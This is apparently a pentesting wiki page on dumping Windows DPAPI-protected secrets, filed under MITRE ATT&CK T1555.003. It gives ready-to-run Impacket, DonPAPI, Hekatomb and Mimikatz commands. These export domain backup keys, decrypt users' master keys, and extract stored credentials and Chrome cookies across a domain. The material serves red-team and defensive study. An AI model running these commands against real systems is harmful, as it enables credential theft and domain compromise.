---
description: MITRE ATT&CK™ Sub-technique T1555.003
---

# DPAPI secrets

## Theory

The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:

```bash
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

Application like Google Chrome, Outlook, Internet Explorer, Skype use the DPAPI. Windows also uses that API for sensitive information like Wi-Fi passwords, certificates, RDP connection passwords, and many more.

Below are common paths of hidden files that usually contain DPAPI-protected data.

```bash
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
### DPAPI.py

&#x20;[Impacket](https://github.com/SecureAuthCorp/impacket)'s [dpapi.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py) can be used to interact with DPAPI.

```bash
# Decrypt a master key
dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD

# Obtain the backup keys & use it to decrypt a master key
dpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGET --export
dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk"

# Decrypt DPAPI-protected data using a master key
dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
```

### DonPAPI

[DonPAPI](https://github.com/login-securite/DonPAPI) (Python) can also be used to remotely extract a user's DPAPI secrets more easily. It supports [pass-the-hash](broken-reference), [pass-the-ticket](broken-reference) and so on.

```bash
DonPAPI.py 'domain'/'username':'password'@<'targetName' or 'address/mask'>
```

### Hekatomb

[Hekatomb](https://github.com/Processus-Thief/HEKATOMB) (python script) can also be used. It connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers and uses Domain backup keys to decrypt them.

```bash
# Obtain the backup keys & use it to decrypt all blob from users
hekatomb $DOMAIN/$USER:$PASSWORD@$TARGET

# Decrypt all blob from users using saved backup key
hekatomb -pkv /path/to/backup_key.pvk $DOMAIN/$USER:$PASSWORD@$TARGET
```
{% endtab %}

{% tab title="Windows" %}
On Windows systems [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can be used to extract, decrypt or use specific master keys using specified passwords or given sufficient privileges.

```bash
# Extract and decrypt a master key
dpapi::masterkey /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID" /sid:$SID /password:$PASSWORD /protected

# Extract and decrypt all master keys
sekurlsa::dpapi

# Extract the backup keys & use it to decrypt a master key
lsadump::backupkeys /system:$DOMAIN_CONTROLLER /export
dpapi::masterkey /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID" /pvk:$BACKUP_KEY_EXPORT_PVK

# Decrypt Chrome data
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"

# Decrypt DPAPI-protected data using a master key
dpapi::cred /in:"C:\path\to\encrypted\file" /masterkey:$MASTERKEY
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets" %}

{% embed url="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords" %}
